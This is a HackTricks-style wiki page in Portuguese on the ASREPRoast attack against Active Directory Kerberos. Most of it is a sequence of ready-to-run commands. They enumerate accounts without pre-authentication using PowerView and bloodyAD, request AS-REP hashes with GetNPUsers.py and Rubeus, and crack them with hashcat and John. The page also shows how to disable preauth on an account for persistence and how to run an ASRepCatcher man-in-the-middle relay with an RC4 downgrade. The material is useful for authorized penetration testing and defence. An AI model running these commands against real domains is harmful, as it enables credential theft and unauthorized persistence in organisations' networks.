# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast é um ataque de segurança que explora usuários que não possuem o **Kerberos pre-authentication required attribute**. Essencialmente, essa vulnerabilidade permite que atacantes solicitem a autenticação de um usuário ao Domain Controller (DC) sem precisar da senha do usuário. O DC então responde com uma mensagem cifrada com a chave derivada da senha do usuário, que os atacantes podem tentar quebrar offline para descobrir a senha.

Os principais requisitos para este ataque são:

- **Lack of Kerberos pre-authentication**: Os usuários alvo não devem ter esse recurso de segurança habilitado.
- **Connection to the Domain Controller (DC)**: Os atacantes precisam de acesso ao DC para enviar requisições e receber mensagens criptografadas.
- **Optional domain account**: Ter uma conta de domínio permite que atacantes identifiquem usuários vulneráveis de forma mais eficiente por meio de consultas LDAP. Sem tal conta, os atacantes precisam adivinhar nomes de usuário.

#### Enumerar usuários vulneráveis (necessita credenciais de domínio)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensagem AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus gerará um 4768 com encryption type 0x17 e preauth type 0.

#### Comandos rápidos (Linux)

- Enumere potenciais alvos primeiro (por exemplo, a partir de leaked build paths) com Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Extraia o AS-REP de um único usuário mesmo com uma senha **em branco** usando `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec também prints LDAP signing/channel binding posture).
- Crack with `hashcat out.asreproast /path/rockyou.txt` – ele detecta automaticamente **-m 18200** (etype 23) para AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistência

Forçar que **preauth** não seja necessário para um usuário para o qual você tem permissões **GenericAll** (ou permissões para escrever propriedades):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sem credenciais

Um atacante pode usar uma posição man-in-the-middle para capturar pacotes AS-REP enquanto atravessam a rede sem depender que a pré-autenticação Kerberos esteja desabilitada. Portanto, funciona para todos os usuários na VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite fazer isso. Além disso, a ferramenta força as estações de trabalho clientes a usar RC4 ao alterar a negociação Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referências

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
